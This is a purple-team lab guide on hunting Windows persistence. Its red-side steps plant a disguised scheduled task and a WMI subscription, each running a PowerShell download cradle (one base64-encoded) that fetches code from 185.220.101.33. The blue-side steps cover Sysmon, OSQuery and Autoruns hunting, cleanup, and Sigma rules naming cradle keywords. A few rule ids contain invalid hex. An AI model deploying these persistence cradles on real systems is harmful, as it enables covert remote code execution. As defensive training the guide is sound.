# Day 06 — Lab Guide: Endpoint Persistence Hunt
### Track: Purple Team | Duration: ~3 hours | Difficulty: Intermediate

> **Lab focus:** Detection and forensics. The "red side" steps create artefacts
> for blue to find — understanding what attackers deploy helps defenders write
> better rules. All activity is confined to an isolated lab VM.

---

## 🛠 Tools Required

| Tool | Purpose | Install |
|------|---------|---------|
| **Sysmon** | Windows event telemetry — registry, WMI, process events | Sysinternals |
| **Velociraptor** | Live endpoint forensics and artifact collection | velocidex/velociraptor |
| **OSQuery** | SQL queries against live system state | osquery.io |
| **Autoruns** | Enumerate all autostart locations — baseline + diff | Sysinternals |
| **Python 3** | Autoruns differential, scoring, report generation | Pre-installed |
| **PowerShell** | Windows queries — WMI namespace, registry, events | Built-in |
| **Sigma CLI** | Validate Sigma rule syntax | `pip install sigma-cli` |

---

## 🖥 Environment Setup

```powershell
# Run as Administrator in isolated Windows 11 lab VM

# 1. Create working directory
New-Item -Path "C:\SecurityLab\Day06\artifacts" -ItemType Directory -Force
Set-Location "C:\SecurityLab\Day06"

# 2. Verify Sysmon is running
Get-Service Sysmon64 | Select-Object Name, Status

# 3. Verify OSQuery
& osqueryi --version

# 4. ─── CRITICAL: Take Autoruns baseline BEFORE any persistence is deployed ───
Write-Host "[*] Taking pre-exercise baseline..."
& "C:\Tools\Autoruns\Autorunsc.exe" -a * -c -h -s -nobanner `
    > "artifacts\autoruns_baseline.csv"
Write-Host "[+] Baseline saved — $(
    (Get-Content artifacts\autoruns_baseline.csv | Measure-Object -Line).Lines
) entries"
```

---

## STEP 1 — Sysmon Config: Enable WMI and Registry Event Coverage

**Objective:** Verify Sysmon captures Events 12/13 (Registry) and 19/20/21
(WMI). These are often absent from default configs.

```powershell
# Check which event IDs are currently enabled
& "C:\Tools\Sysmon\Sysmon64.exe" -c 2>&1 | Select-String "EventType"
```

```xml
<!-- Save as: C:\SecurityLab\Day06\sysmon_day06.xml -->
<Sysmon schemaversion="4.90">
  <EventFiltering>

    <!-- Process Creation — catch payload execution -->
    <RuleGroup name="ProcessCreate" groupRelation="or">
      <ProcessCreate onmatch="include">
        <Image condition="contains">powershell.exe</Image>
        <Image condition="contains">WmiPrvSE.exe</Image>
        <ParentImage condition="contains">svchost.exe</ParentImage>
      </ProcessCreate>
    </RuleGroup>

    <!-- Registry Events 12/13 — catch Run key writes -->
    <RuleGroup name="RegistryEvent" groupRelation="or">
      <RegistryEvent onmatch="include">
        <TargetObject condition="contains">\CurrentVersion\Run</TargetObject>
        <TargetObject condition="contains">\CurrentVersion\RunOnce</TargetObject>
        <TargetObject condition="contains">\Winlogon</TargetObject>
      </RegistryEvent>
    </RuleGroup>

    <!-- WMI Events 19/20/21 — catch subscriptions -->
    <RuleGroup name="WmiEvent" groupRelation="or">
      <WmiEvent onmatch="include">
        <Operation condition="is">Created</Operation>
      </WmiEvent>
    </RuleGroup>

  </EventFiltering>
</Sysmon>
```

```powershell
# Apply config
& "C:\Tools\Sysmon\Sysmon64.exe" -c "C:\SecurityLab\Day06\sysmon_day06.xml"
Write-Host "[+] Sysmon config applied — WMI + registry events now captured"
```

---

## STEP 2 — RED SIDE: Deploy Three Persistence Mechanisms

> **Isolated lab VM only.** Purpose: generate realistic artefacts for detection.
> Record each deployment timestamp — these are your ground truth for scoring.

### Mechanism 1 — Scheduled Task (T+00:00)

```powershell
$M1_Time = Get-Date
Write-Host "[RED M1] Deploying at $M1_Time"

$Action  = New-ScheduledTaskAction -Execute "powershell.exe" `
               -Argument "-WindowStyle Hidden -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOAA1AC4AMgAyADAALgAxADAAMQAuADMAMwAvAHMAdABhAGcAZQAyACcAKQA="
$Trigger = New-ScheduledTaskTrigger -RepetitionInterval (New-TimeSpan -Minutes 60) `
               -Once -At (Get-Date)
$Settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit (New-TimeSpan -Minutes 5)

Register-ScheduledTask `
    -TaskName "MicrosoftEdgeUpdateTaskMachineCore" `
    -Action   $Action `
    -Trigger  $Trigger `
    -Settings $Settings `
    -RunLevel Highest -Force

Write-Host "[RED M1] Scheduled task deployed — start blue clock"
```

### Mechanism 2 — Registry Run Key (T+20:00)

```powershell
$M2_Time = Get-Date
Write-Host "[RED M2] Deploying at $M2_Time"

Set-ItemProperty `
    -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name  "OneDriveStandaloneUpdater" `
    -Value "C:\Users\Public\Libraries\updater.exe" `
    -Type  String

Write-Host "[RED M2] Registry Run key written — HKCU, standard user privs only"
```

### Mechanism 3 — WMI Event Subscription (T+40:00)

```powershell
$M3_Time = Get-Date
Write-Host "[RED M3] Deploying at $M3_Time"

# Filter — trigger condition: system uptime 200-320 seconds post-boot
$Filter = Set-WmiInstance -Namespace "root\subscription" -Class "__EventFilter" `
    -Arguments @{
        Name           = "SCM_EventLog_Filter"
        EventNamespace = "root\cimv2"
        QueryLanguage  = "WQL"
        Query          = "SELECT * FROM __InstanceModificationEvent WITHIN 60 " +
                         "WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' " +
                         "AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320"
    }

# Consumer — action to execute
$Consumer = Set-WmiInstance -Namespace "root\subscription" -Class "CommandLineEventConsumer" `
    -Arguments @{
        Name                = "SCM_EventLog_Consumer"
        CommandLineTemplate = "powershell.exe -WindowStyle Hidden -Command " +
                              "IEX(New-Object Net.WebClient).DownloadString(" +
                              "'http://185.220.101.33/stage2')"
    }

# Binding — glue filter to consumer
Set-WmiInstance -Namespace "root\subscription" -Class "__FilterToConsumerBinding" `
    -Arguments @{ Filter = $Filter; Consumer = $Consumer }

Write-Host "[RED M3] WMI subscription deployed — most stealthy mechanism"

# Save ground truth for scoring
@{ M1=$M1_Time; M2=$M2_Time; M3=$M3_Time } |
    ConvertTo-Json | Out-File "artifacts\red_ground_truth.json"
```

---

## STEP 3 — BLUE: Hunt Mechanism 1 — Scheduled Task

### 3a. Windows Security Event 4698

```powershell
# Event 4698 = A scheduled task was created
Get-WinEvent -FilterHashtable @{
    LogName   = "Security"
    Id        = 4698
    StartTime = (Get-Date).AddHours(-2)
} | ForEach-Object {
    $time = $_.TimeCreated
    $name = ($_.Message | Select-String "Task Name:\s+(.+)" |
             ForEach-Object { $_.Matches.Groups[1].Value })
    Write-Host "[$time] SCHEDULED TASK CREATED: $name"
} | Tee-Object "artifacts\sched_task_event4698.txt"
```

### 3b. OSQuery — Enumerate Suspicious Scheduled Tasks

```sql
-- Run in: osqueryi

-- Find tasks executing interpreters with hidden or encoded flags
SELECT
    name,
    path,
    action,
    hidden,
    run_on_demand,
    last_run_time
FROM scheduled_tasks
WHERE (action LIKE '%powershell%'
    OR action LIKE '%cmd.exe%'
    OR action LIKE '%wscript%'
    OR action LIKE '%mshta%')
AND enabled = 1
ORDER BY last_run_time DESC;
```

```powershell
# Save OSQuery output
& osqueryi --json `
    "SELECT name, path, action, hidden FROM scheduled_tasks WHERE action LIKE '%powershell%'" |
    Out-File "artifacts\osquery_scheduled_tasks.json"

# Record detection time
$M1_Detected = Get-Date
Write-Host "[BLUE] Mechanism 1 detected at: $M1_Detected"
Write-Host "[BLUE] MTTD M1: $(($M1_Detected - (Get-Content artifacts\red_ground_truth.json | ConvertFrom-Json).M1).TotalSeconds) seconds"
```

**✅ Checkpoint 1:** `MicrosoftEdgeUpdateTaskMachineCore` visible in OSQuery
results with `action` containing `powershell` and `hidden = 1`.

---

## STEP 4 — BLUE: Hunt Mechanism 2 — Registry Run Key

### 4a. Sysmon Event 13 — Registry Value Set

```powershell
# Event 13 = Registry value set
Get-WinEvent -FilterHashtable @{
    LogName = "Microsoft-Windows-Sysmon/Operational"
    Id      = @(12, 13)
} | Where-Object { $_.Message -like "*CurrentVersion\Run*" } |
    Select-Object TimeCreated, @{
        N="Detail"
        E={
            ($_.Message -split "`n" |
             Where-Object { $_ -match "TargetObject:|Details:|Image:" }) -join " | "
        }
    } | Tee-Object "artifacts\registry_sysmon_events.txt"
```

### 4b. Full Run Key Enumeration

```powershell
$RunKeyPaths = @(
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
    "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce",
    "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
)

$AllKeys = foreach ($path in $RunKeyPaths) {
    if (Test-Path $path) {
        (Get-ItemProperty $path).PSObject.Properties |
            Where-Object { $_.Name -notlike "PS*" } |
            Select-Object @{N="Path";E={$path}},
                          @{N="Name";E={$_.Name}},
                          @{N="Value";E={$_.Value}}
    }
}

$AllKeys | Format-Table -AutoSize
$AllKeys | ConvertTo-Json | Out-File "artifacts\all_run_keys.json"
```

### 4c. Autoruns Differential Analysis

```powershell
# Take post-deployment Autoruns snapshot
& "C:\Tools\Autoruns\Autorunsc.exe" -a * -c -h -s -nobanner `
    > "artifacts\autoruns_post.csv"
```

```python
# Save as: C:\SecurityLab\Day06\autoruns_diff.py
import csv, sys

def load_csv(path):
    entries = {}
    try:
        with open(path, encoding="utf-16", errors="replace") as f:
            for row in csv.DictReader(f):
                key = (row.get("Entry Location",""), row.get("Entry",""))
                entries[key] = row
    except Exception as e:
        print(f"[!] {path}: {e}")
    return entries

baseline = load_csv("artifacts\\autoruns_baseline.csv")
current  = load_csv("artifacts\\autoruns_post.csv")

new_entries = {k:v for k,v in current.items() if k not in baseline}

print(f"\n{'='*60}")
print(f"  Autoruns Differential — Day 06")
print(f"{'='*60}")

if new_entries:
    print(f"\n[!!!] {len(new_entries)} NEW PERSISTENCE ENTRY/ENTRIES DETECTED:\n")
    for (loc, name), data in new_entries.items():
        print(f"  Location : {loc}")
        print(f"  Entry    : {name}")
        print(f"  Image    : {data.get('Image Path','N/A')}")
        print(f"  Launch   : {data.get('Launch String','N/A')}")
        signed = data.get("Signer","")
        print(f"  Signed   : {'YES — ' + signed if signed else '⚠ NO — SUSPICIOUS'}")
        print()
else:
    print("\n[+] No new Autoruns entries found")

print(f"  Baseline: {len(baseline)} | Current: {len(current)} | Delta: +{len(new_entries)}")
```

```powershell
python3 C:\SecurityLab\Day06\autoruns_diff.py |
    Tee-Object "artifacts\autoruns_diff_results.txt"

$M2_Detected = Get-Date
Write-Host "[BLUE] Mechanism 2 detected at: $M2_Detected"
```

**✅ Checkpoint 2:** `OneDriveStandaloneUpdater` appears in Autoruns diff as a
new unsigned entry pointing to `C:\Users\Public\Libraries\updater.exe`.

---

## STEP 5 — BLUE: Hunt Mechanism 3 — WMI Event Subscription

WMI subscriptions are the hardest — no obvious Security event fires on creation.
You need Sysmon Events 19/20/21 or direct namespace enumeration.

### 5a. Sysmon WMI Events 19 / 20 / 21

```powershell
# Event 19 = WMI Event Filter created
# Event 20 = WMI Event Consumer created
# Event 21 = WMI Filter-Consumer binding created
Get-WinEvent -FilterHashtable @{
    LogName = "Microsoft-Windows-Sysmon/Operational"
    Id      = @(19, 20, 21)
} | Select-Object TimeCreated, Id,
    @{N="Type"; E={@{19="FILTER";20="CONSUMER";21="BINDING"}[$_.Id]}},
    @{N="Detail"; E={
        ($_.Message -split "`n" |
         Where-Object { $_ -match "Name:|Destination:|Filter:|Consumer:" }) -join " | "
    }} | Tee-Object "artifacts\wmi_sysmon_events.txt"
```

### 5b. OSQuery — WMI Namespace Tables

```sql
-- Run in osqueryi

-- List all WMI event filters (the trigger conditions)
SELECT name, query, event_namespace
FROM wmi_event_filters;

-- List command-line consumers (the actions that execute)
SELECT name, command_line_template
FROM wmi_cli_event_consumers;

-- List all filter-to-consumer bindings
SELECT filter, consumer
FROM wmi_filter_consumer_binding;
```

```powershell
# Save all three tables
foreach ($q in @{
    "wmi_filters"   = "SELECT name, query FROM wmi_event_filters"
    "wmi_consumers" = "SELECT name, command_line_template FROM wmi_cli_event_consumers"
    "wmi_bindings"  = "SELECT filter, consumer FROM wmi_filter_consumer_binding"
}.GetEnumerator()) {
    & osqueryi --json $q.Value | Out-File "artifacts\$($q.Key).json"
    Write-Host "[+] Saved artifacts\$($q.Key).json"
}
```

### 5c. Direct PowerShell WMI Namespace Enumeration

```powershell
# Direct query — works without any additional tooling
Write-Host "`n=== WMI Event Filters ==="
Get-WmiObject -Namespace root\subscription -Class __EventFilter |
    Select-Object Name, Query | Format-Table -Wrap

Write-Host "`n=== WMI CommandLine Consumers ==="
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer |
    Select-Object Name, CommandLineTemplate | Format-Table -Wrap

Write-Host "`n=== WMI Bindings ==="
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding |
    Select-Object Filter, Consumer | Format-Table -Wrap

# Save full audit
@{
    Filters   = @(Get-WmiObject -Namespace root\subscription -Class __EventFilter |
                  Select-Object Name, Query, EventNameSpace)
    Consumers = @(Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer |
                  Select-Object Name, CommandLineTemplate)
    Bindings  = @(Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding |
                  Select-Object Filter, Consumer)
} | ConvertTo-Json -Depth 5 | Out-File "artifacts\wmi_subscription_audit.json"

$M3_Detected = Get-Date
Write-Host "`n[BLUE] Mechanism 3 detected at: $M3_Detected"
Write-Host "[BLUE] Consumer command: $(
    (Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer).CommandLineTemplate
)"
```

**✅ Checkpoint 3:** `SCM_EventLog_Consumer` visible with a PowerShell download
cradle pointing to `185.220.101.33` — the same C2 IP from Day 04. This confirms
the persistence mechanism is part of the same campaign.

---

## STEP 6 — Cleanup: Remove All Mechanisms

```powershell
Write-Host "[*] Removing all persistence mechanisms..."

# Remove Scheduled Task
Unregister-ScheduledTask -TaskName "MicrosoftEdgeUpdateTaskMachineCore" -Confirm:$false
Write-Host "[+] Scheduled task removed"

# Remove Registry Run Key
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
    -Name "OneDriveStandaloneUpdater" -ErrorAction SilentlyContinue
Write-Host "[+] Registry run key removed"

# Remove WMI Subscription — must remove all three components
Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding |
    Where-Object { $_.Filter -like "*SCM_EventLog*" } | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer |
    Where-Object { $_.Name -eq "SCM_EventLog_Consumer" } | Remove-WmiObject
Get-WmiObject -Namespace root\subscription -Class __EventFilter |
    Where-Object { $_.Name -eq "SCM_EventLog_Filter" } | Remove-WmiObject
Write-Host "[+] WMI subscription removed (filter + consumer + binding)"

# Verify WMI is clean
$remaining = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
Write-Host "[+] WMI consumers remaining: $($remaining.Count) (expect 0)"
```

---

## STEP 7 — Three Sigma Rules

```bash
# --- SIGMA RULE 1: Scheduled Task Persistence ---
cat > artifacts/sigma_scheduled_task_persistence.yml << 'SIGEOF'
title: Suspicious Scheduled Task Creation with Interpreter Payload
id: d4a7e913-2b8f-4c1a-9e35-7f6b2d8e0c34
status: experimental
description: |
    Detects scheduled task creation where the task action executes a
    scripting interpreter (PowerShell, cmd, wscript, mshta) with flags
    common to malicious use: hidden window, encoded commands, or download
    cradles. Legitimate software tasks rarely use these combinations.
author: Blaakpearl
date: 2025/01/16
references:
    - https://attack.mitre.org/techniques/T1053/005/
tags:
    - attack.persistence
    - attack.t1053.005
    - attack.execution
    - attack.t1059.001
logsource:
    product: windows
    service: security
detection:
    task_created:
        EventID: 4698
    suspicious_payload:
        TaskContent|contains:
            - 'powershell'
            - 'EncodedCommand'
            - 'DownloadString'
            - 'IEX'
            - 'cmd.exe /c'
            - 'wscript'
            - 'mshta'
    filter_legit:
        TaskContent|contains:
            - '\Microsoft\Windows\'
            - 'GoogleUpdateTaskMachine'
            - 'Adobe Acrobat'
    condition: task_created and suspicious_payload and not filter_legit
level: high
falsepositives:
    - Legitimate software installers creating maintenance tasks with PowerShell
    - IT automation (SCCM, Intune) — correlate with change management records
response:
    - Disable task immediately pending investigation
    - Identify creating account — correlate with recent logon events
    - Decode Base64 argument if EncodedCommand present
    - Check if task has already executed via Sysmon Event 1
SIGEOF

# --- SIGMA RULE 2: Registry Run Key Persistence ---
cat > artifacts/sigma_registry_run_key_persistence.yml << 'SIGEOF'
title: Registry Run Key Modification — All User and Machine Paths
id: e5b8f024-3c9e-4d2b-af46-8g7c3e9f1d45
status: stable
description: |
    Detects modification of Windows Run and RunOnce registry keys across
    both HKCU and HKLM hives. HKCU modifications require only standard user
    privileges and are commonly missed by rules covering only HKLM.
    Filters known legitimate software based on image path signing.
author: Blaakpearl
date: 2025/01/16
references:
    - https://attack.mitre.org/techniques/T1547/001/
tags:
    - attack.persistence
    - attack.t1547.001
    - attack.t1112
logsource:
    product: windows
    service: sysmon
detection:
    run_key_write:
        EventID:
            - 12
            - 13
        TargetObject|contains:
            - '\CurrentVersion\Run'
            - '\CurrentVersion\RunOnce'
            - '\WOW6432Node\Microsoft\Windows\CurrentVersion\Run'
    suspicious_value:
        Details|contains:
            - 'powershell'
            - 'AppData\Roaming'
            - 'AppData\Local\Temp'
            - 'C:\Users\Public'
            - 'C:\Windows\Temp'
            - 'http://'
            - 'https://'
            - 'EncodedCommand'
    filter_signed_legit:
        Image|contains:
            - '\OneDrive.exe'
            - '\Teams.exe'
            - 'MicrosoftEdge'
            - 'Spotify.exe'
    condition: run_key_write and (suspicious_value or not filter_signed_legit)
level: medium
falsepositives:
    - Legitimate software installers
    - User-installed applications with auto-start
enrichment:
    - Hash the binary referenced in the value and check VirusTotal
    - Verify the binary is signed by a trusted publisher
SIGEOF

# --- SIGMA RULE 3: WMI Event Subscription Persistence ---
cat > artifacts/sigma_wmi_subscription_persistence.yml << 'SIGEOF'
title: WMI Permanent Event Subscription Created
id: f6c9g135-4d0f-5e3c-bg57-9h8d4f0g2e56
status: experimental
description: |
    Detects creation of WMI permanent event subscriptions — filter, consumer,
    and binding — which are used as a stealthy persistence mechanism that
    survives reboots and is invisible to most standard monitoring without
    specific Sysmon WMI event rules enabled.

    ANY WMI subscription creation outside of approved management tools
    (SCOM, specific monitoring agents) should be treated as Critical and
    escalated to Tier 2 immediately. Legitimate end-user processes almost
    never create permanent WMI subscriptions.
author: Blaakpearl
date: 2025/01/16
references:
    - https://attack.mitre.org/techniques/T1546/003/
tags:
    - attack.persistence
    - attack.t1546.003
    - attack.execution
    - attack.t1059.001
logsource:
    product: windows
    service: sysmon
detection:
    wmi_filter:
        EventID: 19
        Operation: 'Created'
    wmi_consumer:
        EventID: 20
        Operation: 'Created'
    wmi_binding:
        EventID: 21
        Operation: 'Created'
    filter_ms_management:
        Consumer|contains:
            - 'SCM Event Log Consumer'
            - 'Microsoft'
    condition: (wmi_filter or wmi_consumer or wmi_binding) and not filter_ms_management
level: critical
falsepositives:
    - Microsoft System Center Operations Manager (SCOM)
    - Some enterprise monitoring agents — verify against CMDB
response:
    immediate:
        - Escalate to Tier 2 / IR team
        - Isolate host from network
        - Capture WMI namespace before any remediation
    investigate:
        - Run Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer
        - Decode and analyse the CommandLineTemplate value
        - Check if subscription has already fired via WMI-Activity/Operational log
    contain:
        - Remove filter, consumer, and binding — all three required
        - Hunt same subscription on all endpoints via OSQuery fleet query
SIGEOF

echo "[+] All 3 Sigma rules written to artifacts/"
```

---

## STEP 8 — Purple Team Scoring

```python
# Save as: C:\SecurityLab\Day06\purple_team_scoring.py
from datetime import datetime

# Fill in actual timestamps from your lab run
DEPLOY = {
    "M1_Scheduled_Task": datetime(2025, 1, 16, 10,  0,  0),
    "M2_Registry_Run":   datetime(2025, 1, 16, 10, 20,  0),
    "M3_WMI_Sub":        datetime(2025, 1, 16, 10, 40,  0),
}
DETECT = {
    "M1_Scheduled_Task": datetime(2025, 1, 16, 10,  8, 22),
    "M2_Registry_Run":   datetime(2025, 1, 16, 10, 23, 45),
    "M3_WMI_Sub":        datetime(2025, 1, 16, 10, 58, 11),
}
METHODS = {
    "M1_Scheduled_Task": "OSQuery scheduled_tasks + Event 4698",
    "M2_Registry_Run":   "Sysmon Event 13 + Autoruns differential",
    "M3_WMI_Sub":        "PowerShell WMI namespace query + Sysmon Event 20",
}

print("=" * 65)
print("  Purple Team Debrief — Endpoint Persistence Exercise")
print("  Analyst: Blaakpearl | Date: 2025-01-16")
print("=" * 65)
print(f"\n  {'Mechanism':<28} {'MTTD':>9}  Method")
print("  " + "─" * 62)

total, all_detected = 0, True
for mech, deploy in DEPLOY.items():
    detect = DETECT.get(mech)
    if detect:
        secs = (detect - deploy).total_seconds()
        total += secs
        mttd = f"{int(secs//60)}m {int(secs%60)}s"
        flag = "✅"
    else:
        mttd, flag = "MISSED", "❌"
        all_detected = False
    print(f"  {mech.replace('_',' '):<28} {mttd:>9}  {METHODS.get(mech,'—')} {flag}")

avg = total / len(DEPLOY)
print(f"\n  Average MTTD : {int(avg//60)}m {int(avg%60)}s")
print(f"  All detected : {'YES ✅' if all_detected else 'NO ❌'}")
print(f"  2-hour SLA   : {'PASSED ✅' if total < 7200 else 'FAILED ❌'}")

print(f"\n{'='*65}")
print("  DETECTION GAPS IDENTIFIED")
print("=" * 65)
for i, g in enumerate([
    "Sysmon WMI Events 19/20/21 absent from production config — WMI blind spot",
    "Registry Sigma rule covered HKLM only — missed HKCU (no admin required)",
    "Event 4698 requires Audit Object Access policy not in baseline GPO",
    "OSQuery not deployed fleet-wide — point-in-time queries only",
], 1):
    print(f"  {i}. {g}")

print(f"\n{'='*65}")
print("  IMPROVEMENTS DEPLOYED")
print("=" * 65)
for i, imp in enumerate([
    "Sysmon config updated — WMI Events 19/20/21 now enabled fleet-wide",
    "sigma_wmi_subscription_persistence.yml deployed — level: CRITICAL",
    "sigma_registry_run_key_persistence.yml updated — HKCU + HKLM coverage",
    "sigma_scheduled_task_persistence.yml deployed — level: HIGH",
    "OSQuery WMI table queries added to daily hunt checklist",
    "Velociraptor weekly WMI subscription sweep scheduled",
], 1):
    print(f"  {i}. {imp}")
```

```powershell
python3 C:\SecurityLab\Day06\purple_team_scoring.py |
    Tee-Object "artifacts\purple_team_debrief.txt"
```

---

## 🚩 Capture the Flag Checkpoints

- [ ] 🚩 **Flag 1:** What Windows Security Event ID fires on scheduled task creation?
- [ ] 🚩 **Flag 2:** What three Sysmon Event IDs detect WMI subscription creation?
- [ ] 🚩 **Flag 3:** What OSQuery table lists WMI command-line event consumers?
- [ ] 🚩 **Flag 4:** What MITRE technique ID covers WMI Event Subscriptions?
- [ ] 🚩 **Flag 5:** What three WMI classes must be removed to fully clean a WMI subscription?

---

## 📁 Artifacts to Commit

| File | Contents |
|------|---------|
| `sysmon_day06.xml` | Sysmon configuration with WMI + registry event rules |
| `autoruns_baseline.csv` | Pre-deployment Autoruns snapshot |
| `autoruns_post.csv` | Post-deployment Autoruns snapshot |
| `autoruns_diff_results.txt` | Python differential analysis output |
| `red_ground_truth.json` | Deployment timestamps for scoring |
| `sched_task_event4698.txt` | Event 4698 query results |
| `osquery_scheduled_tasks.json` | OSQuery scheduled_tasks output |
| `registry_sysmon_events.txt` | Sysmon Events 12/13 for Run key |
| `all_run_keys.json` | Full Run key enumeration (all paths) |
| `wmi_sysmon_events.txt` | Sysmon Events 19/20/21 |
| `wmi_filters.json` | OSQuery wmi_event_filters output |
| `wmi_consumers.json` | OSQuery wmi_cli_event_consumers output |
| `wmi_bindings.json` | OSQuery wmi_filter_consumer_binding output |
| `wmi_subscription_audit.json` | PowerShell WMI namespace enumeration |
| `sigma_scheduled_task_persistence.yml` | Sigma rule — Mechanism 1 |
| `sigma_registry_run_key_persistence.yml` | Sigma rule — Mechanism 2 |
| `sigma_wmi_subscription_persistence.yml` | Sigma rule — Mechanism 3 |
| `purple_team_debrief.txt` | Scoring, MTTD, gaps, improvements |

---

## 🔧 Troubleshooting

| Issue | Fix |
|-------|-----|
| Sysmon Events 19/20/21 missing | Add `<WmiEvent onmatch="include">` block and restart Sysmon service |
| OSQuery WMI tables empty | Normal before Mechanism 3 deployed — run query after Step 2 |
| Autoruns CSV encoding error | Open with `encoding="utf-16"` in Python — Autorunsc uses UTF-16 |
| Event 4698 not appearing | Enable Audit Object Access in `secpol.msc` → Advanced Audit Policy |
| WMI subscription not cleaned up | Run all three Remove-WmiObject commands separately — order matters |

---

*Next: [REPORT.md](REPORT.md) — Purple team findings and detection gap report*
